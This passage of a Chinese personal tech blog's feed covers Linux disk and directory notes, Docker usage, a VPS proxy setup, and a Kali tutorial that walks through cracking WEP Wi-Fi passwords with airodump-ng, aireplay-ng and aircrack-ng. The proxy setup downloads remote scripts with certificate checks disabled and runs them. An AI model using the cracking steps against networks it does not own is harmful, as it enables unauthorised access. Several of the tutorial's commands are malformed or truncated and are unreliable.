装置名称</p></blockquote><p><code>mount</code>  与<code>umount</code><br>磁盘挂载与卸载命令</p><blockquote><p>mount [-t 文件系统] [-L Label名] [-o 额外选项] [-n]  装置文件名  挂载点</p></blockquote><hr><p>一次性写这么多我的懵了</p><p>这里补充一点笔记</p><blockquote><p>Linux 操作系统的文件数据除了文件实际内容外，通常含有非常多的属性，例如 Linux 操作系统的文件权限（rwx）与文件属性（拥有者、群组、时间参数等）。文件系统通常会将这两部分的数据分别存放在不同的区块，权限与属性存放在 inode 中，至于实际数据则放置到 data block 区块中。另外，还有一个超级区块（superblock）会记录整个文件系统的整体信息，包括 inode 与 block 的总量、使用量、剩余量等。</p><p>inode：记录文件的属性，一个文件占用一个 inode，同时记录此文件的数据所在的 block。</p><p>在 Linux 中，可以使用 stat 命令查看某个文件的 inode 信息：</p></blockquote><p><img src="https://upload-images.jianshu.io/upload_images/10651191-7a113ff572f68046.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="stat命令"></p>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;写在前面&quot;&gt;&lt;a href=&quot;#写在前面&quot; class=&quot;headerlink&quot; title=&quot;写在前面&quot;&gt;&lt;/a&gt;写在前面&lt;/h4&gt;&lt;p&gt;还记得第一次安装虚拟机之后，安装VMware tools的痛苦经历，安装tools的时候会自动弹入一个.tar的文件， 当然我一看就知道是压缩文件， 但是在Linux的图形界面中是怎么也打不开的。 后来百度之后才知道需要用命令行去解压缩， 我的个乖乖， 那么长的文件名我硬是一个个输进去的。。。想想都觉得自己当时好zz&lt;/p&gt;
&lt;h4 id=&quot;磁盘管理&quot;&gt;&lt;a href=&quot;#磁盘管理&quot; class=&quot;headerlink&quot; title=&quot;磁盘管理&quot;&gt;&lt;/a&gt;磁盘管理&lt;/h4&gt;&lt;h5 id=&quot;磁盘的构造&quot;&gt;&lt;a href=&quot;#磁盘的构造&quot; class=&quot;headerlink&quot; title=&quot;磁盘的构造&quot;&gt;&lt;/a&gt;磁盘的构造&lt;/h5&gt;&lt;p&gt;这部分的内容其实是很重要的，但是我现在还不想写， 虽然这部分的内容我是看了不下很多次， 但是始终不是很明白。&lt;/p&gt;
    
    </summary>
    
      <category term="Linux" scheme="https://prontosil.club/categories/Linux/"/>
    
    
      <category term="Linux" scheme="https://prontosil.club/tags/Linux/"/>
    
      <category term="磁盘管理" scheme="https://prontosil.club/tags/%E7%A3%81%E7%9B%98%E7%AE%A1%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>Linux目录配置与分区</title>
    <link href="https://prontosil.club/2019/02/03/Linux%E7%9B%AE%E5%BD%95%E9%85%8D%E7%BD%AE%E4%B8%8E%E5%88%86%E5%8C%BA/"/>
    <id>https://prontosil.club/2019/02/03/Linux目录配置与分区/</id>
    <published>2019-02-03T01:24:09.000Z</published>
    <updated>2019-02-03T11:53:19.312Z</updated>
    
    <content type="html"><![CDATA[<h4 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h4><p>我害怕装Linux双系统， 其实最大的一个原因就是不会分区， 害怕自己分区不对把原有的Windows覆盖掉了，那就得不偿失了</p><h4 id="Linux的目录配置"><a href="#Linux的目录配置" class="headerlink" title="Linux的目录配置"></a>Linux的目录配置</h4><p>FHS 文件层次结构标准</p><p><img src="https://upload-images.jianshu.io/upload_images/10651191-15c60d964b636706.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="约定"></p><p>说实话我没看懂上面那张图。</p><a id="more"></a><p>事实上，FHS针对目录树架构仅定义出三层目录下面应该放置什么数据而已，分别是下面这三个目录的定义：</p><ul><li>/ （root, 根目录）：与开机系统有关；</li><li>/usr （unix software resource）：与软件安装/执行有关；</li><li>/var （variable）：与系统运行过程有关。<br>（还是鸟哥总结的精辟）</li></ul><h5 id="根目录约定"><a href="#根目录约定" class="headerlink" title="根目录约定"></a>根目录约定</h5><h6 id="FHS规定必须存在-根目录下的"><a href="#FHS规定必须存在-根目录下的" class="headerlink" title="FHS规定必须存在 根目录下的"></a>FHS规定必须存在 根目录下的</h6><p>/bin   放置可执行文件的目录<br>/boot 放置开机会使用到的文件<br>/dev 设备文件， 比较重要的文件有： /dev/zero， /dev/tty， /dev/sd<br>/etc 系统主要的配置文件几乎都存放在这个目录<br>特别重要的目录有： /etc/modprobe.d/, /etc/passwd, /etc/fstab, /etc/issue<br>/lib 放置函数库的目录<br>/media 软盘， 光盘， DVD等设备都暂时挂载于此<br>/mnt  也是挂载设备的目录， 其中 Windows上的Ubuntu就是通过这个目录去挂载windows上的其他的目录的<br>/opt 第三方协力软件放置的目录<br>/run 开机所产生的信息放置到这个目录下<br>/sbin 设置系统环境的文件的目录<br>/srv 服务的目录<br>/tmp 暂时存放的目录</p><p>/usr<br>/var<br>以上两个目录是另外设置的， 但是也位于根目录中。</p><h6 id="可选的目录"><a href="#可选的目录" class="headerlink" title="可选的目录"></a>可选的目录</h6><p>/home /lib<qual> /root</qual></p><p>先放这张图便于理解目录的层次结构<br><img src="https://upload-images.jianshu.io/upload_images/10651191-549937925edb9ca6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="目录树架构"></p><p>其中 /proc  是一个虚拟文件系统<br>/sys 也是一个虚拟的文件系统<br>/lost+found 当文件发生错误的时候， 将一些遗失的片段放入到这个目录</p><h5 id="usr目录约定"><a href="#usr目录约定" class="headerlink" title="/usr目录约定"></a>/usr目录约定</h5><p>是 Unix software resource 的缩写， 不是User的缩写</p><h6 id="必须的目录"><a href="#必须的目录" class="headerlink" title="必须的目录"></a>必须的目录</h6><p>/usr/bin 所有一般用户能够用到的指令都放在这里<br>/usr/lib 功能与/lib相同， 可以将/lib链接到这个目录<br>/usr/local 系统管理员下载的软件，建议安装到这个目录<br>/usr/sbin 非系统正常运行所需要的指令， 所以可以将/sbin 链接到此目录<br>/usr/share 主要放置只读架构的数据文件，当然也包括共享文件<br>其中可能存在次目录 /usr/share/man 线上说明文档<br>/usr/share/doc 软件杂项的文件说明<br>/usr/share/zoneinfo 与时区有关的文件</p><h5 id="var目录约定"><a href="#var目录约定" class="headerlink" title="/var目录约定"></a>/var目录约定</h5><h6 id="必须的目录-1"><a href="#必须的目录-1" class="headerlink" title="必须的目录"></a>必须的目录</h6><p>/var/cache 缓存目录<br>/var/lib 程序执行时候的数据文件放置的目录<br>/var/lock 上锁的目录<br>/var/log 登陆文件放置的目录<br>/var/mail 电子邮件信箱的目录， 不过这个目录也被放置到/var/spool/mail<br>/var/run 放置PID的目录<br>/var/spool 伫列数据的目录</p><hr><p>不过鸟哥也总结了，centos 稍做了修改</p><ul><li>/bin —&gt; /usr/bin</li><li>/sbin —&gt; /usr/sbin</li><li>/lib —&gt; /usr/lib</li><li>/lib64 —&gt; /usr/lib64</li><li>/var/lock —&gt; /run/lock</li><li>/var/run —&gt; /run</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;写在前面&quot;&gt;&lt;a href=&quot;#写在前面&quot; class=&quot;headerlink&quot; title=&quot;写在前面&quot;&gt;&lt;/a&gt;写在前面&lt;/h4&gt;&lt;p&gt;我害怕装Linux双系统， 其实最大的一个原因就是不会分区， 害怕自己分区不对把原有的Windows覆盖掉了，那就得不偿失了&lt;/p&gt;
&lt;h4 id=&quot;Linux的目录配置&quot;&gt;&lt;a href=&quot;#Linux的目录配置&quot; class=&quot;headerlink&quot; title=&quot;Linux的目录配置&quot;&gt;&lt;/a&gt;Linux的目录配置&lt;/h4&gt;&lt;p&gt;FHS 文件层次结构标准&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://upload-images.jianshu.io/upload_images/10651191-15c60d964b636706.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240&quot; alt=&quot;约定&quot;&gt;&lt;/p&gt;
&lt;p&gt;说实话我没看懂上面那张图。&lt;/p&gt;
    
    </summary>
    
      <category term="Linux" scheme="https://prontosil.club/categories/Linux/"/>
    
    
      <category term="Linux" scheme="https://prontosil.club/tags/Linux/"/>
    
      <category term="FHS" scheme="https://prontosil.club/tags/FHS/"/>
    
  </entry>
  
  <entry>
    <title>使用kali破解无线网络密码</title>
    <link href="https://prontosil.club/2019/02/03/%E4%BD%BF%E7%94%A8kali%E7%A0%B4%E8%A7%A3%E6%97%A0%E7%BA%BF%E7%BD%91%E7%BB%9C%E5%AF%86%E7%A0%81/"/>
    <id>https://prontosil.club/2019/02/03/使用kali破解无线网络密码/</id>
    <published>2019-02-03T01:23:50.000Z</published>
    <updated>2019-02-03T11:57:17.670Z</updated>
    
    <content type="html"><![CDATA[<h3 id="使用Aircrack-ng破解无线网络"><a href="#使用Aircrack-ng破解无线网络" class="headerlink" title="使用Aircrack-ng破解无线网络"></a>使用<code>Aircrack-ng</code>破解无线网络</h3><h5 id="无线网络的加密工具有哪些？"><a href="#无线网络的加密工具有哪些？" class="headerlink" title="无线网络的加密工具有哪些？"></a>无线网络的加密工具有哪些？</h5><hr><h4 id="破解WEP加密的无线网络"><a href="#破解WEP加密的无线网络" class="headerlink" title="破解WEP加密的无线网络"></a>破解WEP加密的无线网络</h4><a id="more"></a><p><strong>具体操作如下：</strong></p><h5 id="1-使用airmon-ng命令查看当前系统中的无线网络接口。"><a href="#1-使用airmon-ng命令查看当前系统中的无线网络接口。" class="headerlink" title="1 使用airmon-ng命令查看当前系统中的无线网络接口。"></a>1 使用<code>airmon-ng</code>命令查看当前系统中的无线网络接口。</h5><h5 id="2-修改wlan0接口的MAC地址，-因为MAC地址标识主机所在的网络，-在修改MAC地址之前，-需要停止该接口。"><a href="#2-修改wlan0接口的MAC地址，-因为MAC地址标识主机所在的网络，-在修改MAC地址之前，-需要停止该接口。" class="headerlink" title="2 修改wlan0接口的MAC地址， 因为MAC地址标识主机所在的网络， 在修改MAC地址之前， 需要停止该接口。"></a>2 修改<code>wlan0</code>接口的MAC地址， 因为MAC地址标识主机所在的网络， 在修改MAC地址之前， 需要停止该接口。</h5><p>命令如下： <code>airmon-ng stop wlan0</code><br>或者如下： <code>ifconfig wlan0 down</code></p><p>执行以上命令使得wlan0接口停止了， 此时可以修改MAC地址了，命令如下：</p><p><code>macchanger --mac 00:11:22:33:44:55 wlan0</code></p><h5 id="3-重新启动wlan0"><a href="#3-重新启动wlan0" class="headerlink" title="3 重新启动wlan0"></a>3 重新启动wlan0</h5><p>命令如下： <code>airmon-ng start wlan0</code></p><h5 id="4-使用airodump-命令定位附近所有可用的无线网络："><a href="#4-使用airodump-命令定位附近所有可用的无线网络：" class="headerlink" title="4 使用airodump 命令定位附近所有可用的无线网络："></a>4 使用airodump 命令定位附近所有可用的无线网络：</h5><p>命令如下： <code>airodump-ng wlan0</code></p><p>输出的信息含义如下：<br><strong>BSSID</strong> 无线的IP地址<br><strong>PWR</strong> 网卡报告的信号水平<br><strong>Beacons</strong> 无线发出的通告编号<br><strong>#Data</strong> 被捕获到的数据分组的数量， 包括广播分组<br><strong> #/s </strong>  过去10秒钟内每秒捕获的数据分组的数量</p><h5 id="5-使用airodump-ng-捕获指定BSSID的文件"><a href="#5-使用airodump-ng-捕获指定BSSID的文件" class="headerlink" title="5 使用airodump-ng 捕获指定BSSID的文件"></a>5 使用airodump-ng 捕获指定BSSID的文件</h5><p>airodump-ng命令常用的选项如下所示。</p><ul><li>-c：指定选择的频道。</li><li>-w：指定一个文件名，用于保存捕获的数据。</li><li>-bssid：指定攻击的BSSID。</li></ul><p>示例命令如下： <code>airodump-ng    -c wirelessattack -bssid Haddr</code></p><h5 id="6-打开一个新的终端窗口，运行aireplay命令"><a href="#6-打开一个新的终端窗口，运行aireplay命令" class="headerlink" title="6 打开一个新的终端窗口，运行aireplay命令"></a>6 打开一个新的终端窗口，运行aireplay命令</h5><p><code>airplay</code> 命令的语法格式如下：</p><blockquote><p>aireplay-ng -1 0 -a [BSSID] -h [our Chosen MAC address] -e [ESSID] [Interface]<br>aireplay-ng -dauth 1 -a [BSSID] -c [our Chosen MAC address] [Interface]</p></blockquote><p>示例命令如下: <code>aireplay-ng -1 0 -a 14:E6:E4:AC:FB:20 -h 00:11:22:33:44:55 -e Test mon0</code></p><h5 id="7-使用aireplay发送一些数据给无线路由器，以至于能捕获到数据"><a href="#7-使用aireplay发送一些数据给无线路由器，以至于能捕获到数据" class="headerlink" title="7 使用aireplay发送一些数据给无线路由器，以至于能捕获到数据"></a>7 使用aireplay发送一些数据给无线路由器，以至于能捕获到数据</h5><blockquote><p>aireplay-ng 3 -b [BSSID] -h [Our chosen MAC address] [Interface]</p></blockquote><p>示例命令：<br><code>aireplay-ng -3 -b 14:E6:E4:AC:FB:20 -h 00:11:22:33:44:55 mon0</code></p><h5 id="8-使用Aircrack破解密码"><a href="#8-使用Aircrack破解密码" class="headerlink" title="8 使用Aircrack破解密码"></a>8 使用Aircrack破解密码</h5><p>示例命令： `aircrack-ng -b Haddr </p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;使用Aircrack-ng破解无线网络&quot;&gt;&lt;a href=&quot;#使用Aircrack-ng破解无线网络&quot; class=&quot;headerlink&quot; title=&quot;使用Aircrack-ng破解无线网络&quot;&gt;&lt;/a&gt;使用&lt;code&gt;Aircrack-ng&lt;/code&gt;破解无线网络&lt;/h3&gt;&lt;h5 id=&quot;无线网络的加密工具有哪些？&quot;&gt;&lt;a href=&quot;#无线网络的加密工具有哪些？&quot; class=&quot;headerlink&quot; title=&quot;无线网络的加密工具有哪些？&quot;&gt;&lt;/a&gt;无线网络的加密工具有哪些？&lt;/h5&gt;&lt;hr&gt;
&lt;h4 id=&quot;破解WEP加密的无线网络&quot;&gt;&lt;a href=&quot;#破解WEP加密的无线网络&quot; class=&quot;headerlink&quot; title=&quot;破解WEP加密的无线网络&quot;&gt;&lt;/a&gt;破解WEP加密的无线网络&lt;/h4&gt;
    
    </summary>
    
      <category term="kali" scheme="https://prontosil.club/categories/kali/"/>
    
    
      <category term="kali" scheme="https://prontosil.club/tags/kali/"/>
    
      <category term="WLAN" scheme="https://prontosil.club/tags/WLAN/"/>
    
      <category term="aircrack-ng" scheme="https://prontosil.club/tags/aircrack-ng/"/>
    
  </entry>
  
  <entry>
    <title>科学上网</title>
    <link href="https://prontosil.club/2019/02/01/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/"/>
    <id>https://prontosil.club/2019/02/01/科学上网/</id>
    <published>2019-02-01T06:29:44.000Z</published>
    <updated>2019-02-10T13:39:47.052Z</updated>
    
    <content type="html"><![CDATA[<h4 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h4><p>就在昨天，我在逛推特的时候，无意中发现了一个似曾相识的人，竟然还是twitter推荐给我的！<br><img src="https://upload-images.jianshu.io/upload_images/10651191-2252ca4aed23b156.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="偶遇故人"></p><p>于是果断地扣了一下学长，学长告诉我可以自己组建vpn，但是觉得好神奇，后来试了一下，别说，还真行。</p><h4 id="知识储备"><a href="#知识储备" class="headerlink" title="知识储备"></a>知识储备</h4><p><a href="https://zh.wikipedia.org/wiki/%E9%98%B2%E7%81%AB%E9%95%BF%E5%9F%8E" target="_blank" rel="noopener">中国国家防火墙</a></p><p><code>SOCKS</code> 是SOCKetS的缩写<br><a href="https://zh.wikipedia.org/wiki/SOCKS#SOCK5" target="_blank" rel="noopener">是一种网络传输协议，主要用于客户端与外网服务器之间通讯的中间传递。</a></p><p>SOCKS是会话层协议，位于表示层和传输层之间。<br>SOCKS的实际例子：</p><a id="more"></a><blockquote><p>Bill希望通过互联网与Jane沟通，但他们的网络之间存在一个<a href="https://zh.wikipedia.org/wiki/%E9%98%B2%E7%81%AB%E5%A2%99" title="防火墙" target="_blank" rel="noopener">防火墙</a>，Bill不能直接与Jane沟通。所以，Bill连接到他的网络上的SOCKS代理，告知它他想要与Jane创建连接；SOCKS代理打开一个能穿过防火墙的连接，并促进Bill和Jane之间的通信。</p></blockquote><p><code>Shadowsocks</code><br>一种基于<a href="https://zh.wikipedia.org/wiki/SOCKS#SOCK5" title="SOCKS" target="_blank" rel="noopener">Socks5</a>代理方式的加密传输协议，也可以指实现这个协议的各种开发包。<br><a href="https://zh.wikipedia.org/wiki/Shadowsocks" target="_blank" rel="noopener">维基百科定义</a></p><p>Shadowsocks的运行原理与其他代理工具基本相同，使用特定的中转服务器完成数据传输。<br>运行原理：</p><p>在服务器端部署完成后，用户需要按照指定的密码、加密方式和端口，使用客户端软件与其连接。在成功连接到服务器后，客户端会在本机上构建一个本地Socks5代理（或VPN、透明代理）。浏览网络时，网络流量会被分到本地Socks5代理，客户端将其加密之后发送到服务器，服务器以同样的加密方式将流量回传给客户端，以此实现代理上网。</p><p>主要项目分支：<br>ShadowsocksR</p><h4 id="科学上网"><a href="#科学上网" class="headerlink" title="科学上网"></a>科学上网</h4><p>使用<a href="https://bandwagonhost.com/index.php" target="_blank" rel="noopener">搬瓦工</a>搭建VPS</p><p>进入之后就可以看到这个界面了，<br><img src="https://upload-images.jianshu.io/upload_images/10651191-1f97f929db4d2a2f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="界面"></p><p>当然是选择最便宜的啦<br>不过要注意我们一定要选KVM架构的，只有KVM架构才能使用bbr加速</p><p>之后登陆控制面板<br><img src="https://upload-images.jianshu.io/upload_images/10651191-1afef07288cf34e9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="控制面板"><br>我们需要安装一个<code>debian 64</code>位的操作系统</p><p>然后这个时候在本地去连接VPS<br>ssh root@[ip地址] -P[端口号]</p><p>使用下面这串代码进行ssr搭建<br>wget -N —no-check-certificate <a href="https://raw.githubusercontent.com/ToyoDAdoubi/doubi/master/ssr.sh" target="_blank" rel="noopener">https://raw.githubusercontent.com/ToyoDAdoubi/doubi/master/ssr.sh</a> &amp;&amp; chmod +x ssr.sh &amp;&amp; bash ssr.sh</p><p>大部分都是默认安装<br><img src="https://upload-images.jianshu.io/upload_images/10651191-ab85693bbfeb95b9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="ssr安装后的结果"></p><p>之后 <code>bash ssr.sh</code></p><p>安装bbr加速<br>wget —no-check-certificate <a href="https://github.com/teddysun/across/raw/master/bbr.sh" target="_blank" rel="noopener">https://github.com/teddysun/across/raw/master/bbr.sh</a></p><p>chmod +x bbr.sh<br>./bbr.sh<br><img src="https://upload-images.jianshu.io/upload_images/10651191-10f625c23daf93cd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><hr><p>然而上面写的用搬瓦工搭建的一个翻墙只是一个教程， 而且由于跟风者众多， 所以其实效果并不怎么样。</p><p>而我呢， 看的是这个刘伟的教程， 不过我经常访问不了他的网站。</p><p>用vultr购买服务器之后搭建ss服务， 目前来看ssr服务已经用不了了。 </p><p><img src="https://upload-images.jianshu.io/upload_images/10651191-6475288e3364b8f6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="ss小飞机"></p><p>科学上网需谨慎呀</p>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;写在前面&quot;&gt;&lt;a href=&quot;#写在前面&quot; class=&quot;headerlink&quot; title=&quot;写在前面&quot;&gt;&lt;/a&gt;写在前面&lt;/h4&gt;&lt;p&gt;就在昨天，我在逛推特的时候，无意中发现了一个似曾相识的人，竟然还是twitter推荐给我的！&lt;br&gt;&lt;img src=&quot;https://upload-images.jianshu.io/upload_images/10651191-2252ca4aed23b156.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240&quot; alt=&quot;偶遇故人&quot;&gt;&lt;/p&gt;
&lt;p&gt;于是果断地扣了一下学长，学长告诉我可以自己组建vpn，但是觉得好神奇，后来试了一下，别说，还真行。&lt;/p&gt;
&lt;h4 id=&quot;知识储备&quot;&gt;&lt;a href=&quot;#知识储备&quot; class=&quot;headerlink&quot; title=&quot;知识储备&quot;&gt;&lt;/a&gt;知识储备&lt;/h4&gt;&lt;p&gt;&lt;a href=&quot;https://zh.wikipedia.org/wiki/%E9%98%B2%E7%81%AB%E9%95%BF%E5%9F%8E&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;中国国家防火墙&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;SOCKS&lt;/code&gt; 是SOCKetS的缩写&lt;br&gt;&lt;a href=&quot;https://zh.wikipedia.org/wiki/SOCKS#SOCK5&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;是一种网络传输协议，主要用于客户端与外网服务器之间通讯的中间传递。&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;SOCKS是会话层协议，位于表示层和传输层之间。&lt;br&gt;SOCKS的实际例子：&lt;/p&gt;
    
    </summary>
    
      <category term="瞎折腾" scheme="https://prontosil.club/categories/%E7%9E%8E%E6%8A%98%E8%85%BE/"/>
    
    
      <category term="fq" scheme="https://prontosil.club/tags/fq/"/>
    
      <category term="VPS" scheme="https://prontosil.club/tags/VPS/"/>
    
  </entry>
  
  <entry>
    <title>docker 实战</title>
    <link href="https://prontosil.club/2019/02/01/docker-%E5%AE%9E%E6%88%98/"/>
    <id>https://prontosil.club/2019/02/01/docker-实战/</id>
    <published>2019-02-01T06:23:51.000Z</published>
    <updated>2019-02-03T11:57:25.296Z</updated>
    
    <content type="html"><![CDATA[<h4 id="引子"><a href="#引子" class="headerlink" title="引子"></a>引子</h4><p>我花了大概半天多的时间去学习了一些关于docker底层的知识，看的是华为的那本docker实战， 同样的第一遍是一头雾水， 但是之后感觉其中写到的cgroup和namespace， 还有docker最底层的东西的介绍，其实都加深了对docker的认识。在此之上，我使用了我们之前打hctf比赛的源码， 利用它提供的dockerfile成功地搭建了一个ruby on rails网站，第一次领悟到了docker的魅力， 这篇文章讲讲述我使用docker所做的事情， 不断更新中。</p><h4 id="利用docker镜像"><a href="#利用docker镜像" class="headerlink" title="利用docker镜像"></a>利用docker镜像</h4><h5 id="tensorflow环境搭建"><a href="#tensorflow环境搭建" class="headerlink" title="tensorflow环境搭建"></a>tensorflow环境搭建</h5><p><a href="https://segmentfault.com/a/1190000015053704" target="_blank" rel="noopener">基于docker搭建tensorflow环境</a></p><p>关于tensorflow我之后再还会继续写一个专题， 暂且按下不表。</p><p>从docker hub上pull下一个tensorflow image<br>之后如果想用jupyter notebook来开发， 可以参考如下命令</p><blockquote><p>docker run -it -p 8888:8888 tensorflow/tensorflow</p></blockquote><p>但是我现在都还没有处理好jupyter notebook的远程访问问题(我自己起的名字)，所以还是直接用bash的好<br>其实shell环境下的ipython也是很不错的</p><blockquote><p>docker run -it tensorflow/tensorflow bash</p></blockquote><a id="more"></a><h5 id="ruby-on-rails-web网站搭建"><a href="#ruby-on-rails-web网站搭建" class="headerlink" title="ruby on rails web网站搭建"></a>ruby on rails web网站搭建</h5><p>这里用到的是hctf的一道web题提供的<a href="https://github.com/fantasyqt/hctf2018_share" target="_blank" rel="noopener">源码</a></p><p>其实步骤也挺简单的，不过毕竟是自己第一次成功地搭建了一个网站</p><blockquote><p>sudo docker build -t hctf:test .<br>sudo docker run -dt -p 2000:3000  hctf:test bash</p></blockquote><p>然后需要运行一个 ./run.sh</p><hr><p>补充一下docker 运行容器内命令的方法， </p><ol><li>docker exec</li><li>进入bash之后再运行</li></ol><p><a href="http://www.runoob.com/docker/docker-exec-command.html" target="_blank" rel="noopener">docker exec命令详解</a></p><p>在docker中以交互模式运行一个容器内的sh脚本命令如下：</p><blockquote><p>docker exec -it containerID /bin/sh    sh脚本的文件路径</p></blockquote><p>或者开启一个bash</p><blockquote><p>docker exec -it containerID /bin/bash</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;引子&quot;&gt;&lt;a href=&quot;#引子&quot; class=&quot;headerlink&quot; title=&quot;引子&quot;&gt;&lt;/a&gt;引子&lt;/h4&gt;&lt;p&gt;我花了大概半天多的时间去学习了一些关于docker底层的知识，看的是华为的那本docker实战， 同样的第一遍是一头雾水， 但是之后感觉其中写到的cgroup和namespace， 还有docker最底层的东西的介绍，其实都加深了对docker的认识。在此之上，我使用了我们之前打hctf比赛的源码， 利用它提供的dockerfile成功地搭建了一个ruby on rails网站，第一次领悟到了docker的魅力， 这篇文章讲讲述我使用docker所做的事情， 不断更新中。&lt;/p&gt;
&lt;h4 id=&quot;利用docker镜像&quot;&gt;&lt;a href=&quot;#利用docker镜像&quot; class=&quot;headerlink&quot; title=&quot;利用docker镜像&quot;&gt;&lt;/a&gt;利用docker镜像&lt;/h4&gt;&lt;h5 id=&quot;tensorflow环境搭建&quot;&gt;&lt;a href=&quot;#tensorflow环境搭建&quot; class=&quot;headerlink&quot; title=&quot;tensorflow环境搭建&quot;&gt;&lt;/a&gt;tensorflow环境搭建&lt;/h5&gt;&lt;p&gt;&lt;a href=&quot;https://segmentfault.com/a/1190000015053704&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;基于docker搭建tensorflow环境&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;关于tensorflow我之后再还会继续写一个专题， 暂且按下不表。&lt;/p&gt;
&lt;p&gt;从docker hub上pull下一个tensorflow image&lt;br&gt;之后如果想用jupyter notebook来开发， 可以参考如下命令&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;docker run -it -p 8888:8888 tensorflow/tensorflow&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;但是我现在都还没有处理好jupyter notebook的远程访问问题(我自己起的名字)，所以还是直接用bash的好&lt;br&gt;其实shell环境下的ipython也是很不错的&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;docker run -it tensorflow/tensorflow bash&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="docker" scheme="https://prontosil.club/categories/docker/"/>
    
    
      <category term="docker" scheme="https://prontosil.club/tags/docker/"/>
    
      <category term="tensorflow" scheme="https://prontosil.club/tags/tensorflow/"/>
    
      <category term="ruby" scheme="https://prontosil.club/tags/ruby/"/>
    
  </entry>
  
  <entry>
    <title>新一年的想法</title>
    <link href="https://prontosil.club/2019/02/01/%E6%96%B0%E4%B8%80%E5%B9%B4%E7%9A%84%E6%83%B3%E6%B3%95/"/>
    <id>https://prontosil.club/2019/02/01/新一年的想法/</id>
    <published>2019-02-01T03:38:37.000Z</published>
    <updated>2019-02-10T13:40:51.247Z</updated>
    
    <content type="html"><![CDATA[<h4 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h4><p>回家之后确实颓废了蛮久， 前十天左右都是在忙数模竞赛的事情， 抱着司守奎老师的书啃了半天没看懂讲的是啥。然后回到家之后也挺不适应的， 想想有大概一年没听我妈唠叨了，突然exposed in this situation ， 自然有点令人抓狂。 最令我有点想打人的是， 为啥一到家我的电脑和pad全部罢工， 充不进电！！开始吓坏我了，还以为刚买的就坏了， 后来才之后原来pad这么娇气的呀， 非得用被子裹着， 暖着它， 才肯充进去电。 电脑的问题我也没怎么弄清楚。先放一张图片吧，反正目前能用就行。<br><img src="https://upload-images.jianshu.io/upload_images/10651191-1a9d08e07adc86a5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><a id="more"></a><h4 id="经过"><a href="#经过" class="headerlink" title="经过"></a>经过</h4><p>不过那几天学的也挺多的， 虽然司老师那本书确实有些难， 不过耐不住我天天抱着看嘛(补充一句我看的是电子版,冒得钱), 学会了好多个算法， 像层次分析法， 灰度预测， 线性规划， 熵权法， 还有神经网络算法等等。也让我明白了计算机这个学科的某些特殊性。<br>之后就是连着几天的昏天黑地的写论文了， 不过在这段时间我迷上了铁齿铜牙纪晓岚， 从中也学会了许多做人的道理， 甚至，还有一些为官的道理， 毛主席说的好嘛， 政治，就是把支持我们的人搞得多多的， 把反对我们的人搞得少少的， 这就是政治了， 想想去年一年担任学习部部长， 要是早点知道这条道理，也不至于过的那么惨嘛hhh。<br>某一天想起来逛了以下szf大佬的博客， 看到他也写了一篇新一年的规划什么的， 不过字数肯定没我的多。 本来想着当时也写一篇的， 但是由于种种原因耽误了， 现在想想， 我所谓的新年嘛， 当然是指农历的新年咯， 所以在还有三天之后就过年的这个时间点， 我就写下这篇新年的想法吧。</p><h4 id="回顾"><a href="#回顾" class="headerlink" title="回顾"></a>回顾</h4><p>回顾2018吧， 我现在想想又做了些啥呢？ 其实2018年做的好多事都是一个引子， 就比如简书吧， 那是我2018年年初的时候开始入坑的， 现在我已经离不开这个平台了， 再之后是git， 一个版本控制工具， 我曾今还把git和GitHub傻傻分不清， 然而现在， GitHub这个最大的源代码托管平台， git这个及其强大的版本控制工具， 不管是管理自己的文件还是开发， 都是我最离不开的。 除此之外， 还有很多， 2018年我打开了好多个事物的大门， 2019年就需要我不断地在这些方面发力了。总结一下我需要在哪些东西上面发力吧。</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><ol><li>云计算： docker， gcp， AWS</li><li>后端： Django， flask</li><li>游戏： Unity</li><li>软件： 逆向， pwn</li><li>web： 各种渗透测试的工具</li><li>操作系统：Linux， 主要是ubuntu&amp;kali</li></ol><p>有时候很悲观，总觉得自己想学那么多，结果啥都学不会<br>但是有时候又很乐观， 想不断地去学习新的东西， 以至于什么都去钻。<br>维持这种不断往外扩张的，我觉得也行，但是一定要集中精力学完一样之后方可开始去学的新的东西。</p>]]></content>
    
    <summary type="html">
    
